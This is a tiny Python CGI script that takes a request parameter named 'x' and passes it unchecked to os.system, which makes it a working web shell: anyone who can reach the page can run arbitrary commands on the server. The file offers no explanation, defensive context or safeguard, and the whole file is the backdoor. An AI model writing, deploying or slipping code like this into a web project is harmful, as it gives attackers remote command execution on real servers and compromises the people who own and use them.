#!/usr/bin/python3
import cgi
import cgitb
#cgitb.enable()

print("Content-type:text/html")

print("")
data = cgi.FieldStorage()
web = data.getvalue('x')
x=cgi.os.system(web)
print(x)

